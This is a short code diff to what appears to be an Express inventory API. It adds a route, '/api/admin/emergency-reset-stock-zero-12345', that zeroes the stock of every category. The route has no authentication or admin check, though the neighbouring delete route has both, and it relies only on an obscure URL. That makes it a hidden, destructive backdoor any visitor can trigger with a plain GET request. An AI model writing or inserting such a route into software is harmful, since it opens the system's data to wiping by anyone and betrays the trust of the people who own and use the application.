@@ -740,6 +740,13 @@ app.delete('/api/categories/:code', authenticateToken, requireAdmin, (req, res) 
   });
 });
 
+app.get('/api/admin/emergency-reset-stock-zero-12345', (req, res) => {
+  db.run("UPDATE categories SET stock = 0", [], function(err) {
+    if (err) return res.status(500).json({ error: err.message });
+    res.json({ success: true, rowsAffected: this.changes });
+  });
+});
+
 // Products
 app.get('/api/products', (req, res) => {
   db.all("SELECT * FROM products", [], (err, rows) => {
